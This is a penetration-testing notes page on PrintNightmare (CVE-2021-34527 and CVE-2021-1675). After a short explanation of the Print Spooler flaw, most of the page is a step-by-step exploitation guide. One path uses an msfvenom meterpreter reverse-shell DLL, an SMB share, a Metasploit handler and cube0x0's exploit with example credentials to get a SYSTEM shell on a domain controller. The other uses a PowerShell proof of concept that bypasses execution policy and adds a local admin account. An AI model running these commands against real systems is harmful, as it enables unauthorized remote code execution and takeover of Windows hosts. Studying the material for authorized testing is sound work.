---
title: PrintNightmare - SeLoadDriverPrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
---
# 🖨️ PrintNightmare (SeLoadDriverPrivilege)

!!! tip "Kernel exploits"
	- [Windows kernel exploits](windows-kernel-exploits.md)
	- [Linux kernel exploits](linux-kernel-exploits.md)



`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. 

It is a flaw in [RpcAddPrinterDriver](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler.

This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely.  The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system.

>The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare." Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly.****

## cube0x0 exploit

We will be using [cube0x0's](https://github.com/cube0x0/CVE-2021-1675) exploit.

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. Consider the posibility of using  pyenv like this:

```bash
pyenv virtualenv 3.11.7 cube   
pyenv activate  cube

pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Enumerating for MS-RPRN:

```bash
# We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
rpcdump.py @$DomainControllerIP | egrep 'MS-RPRN|MS-PAR'
# Example:
# rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPhost LPORT=8080 -f dll > $FileName.dll
# Example:
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

We will then host this payload in an SMB share we create on our attack host using smbserver.py.

```bash
# Creating a Share with smbserver.py
sudo smbserver.py -smb2support $ShareName /path/to/$FileName.dll
# Example:
# sudo smbserver.py -smb2support CompData /home/
# This will leave our terminal in the host machine with no other use than that of sharing.
```

Then we will need to open a two new terminals in our attacker machine:

```bash
# In the first terminal we will configure ant start a MSF multi/handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

```bash
# In the second terminal we will connect via ssh with the host machine:
ssh $user@$ip

# Then we run the exploit:
sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py $user/$user:$password@$domainControllerIP  '\\$ipHostMachine\$ShareName\$filename.dll'
# Example:
# sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

The payload will then call back to our multi handler giving us an elevated SYSTEM shell.


## calebstewart Powershell exploit

[This PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

```
git clone https://github.com/calebstewart/CVE-2021-1675.git
cd CVE-2021-1675
```


Checking for Spooler Service:

```powershell-session
ls \\localhost\pipe\spoolss
```

Output:

```powershell-session

    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```


**Adding Local Admin with PrintNightmare PowerShell PoC:** 

First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

Now we can import the PowerShell script `CVE-2021-1675.ps1` and use it to add a new local admin user.

```powershell-session
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

**Confirming New Admin User**: If all went to plan, we will have a new local admin user under our control. Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.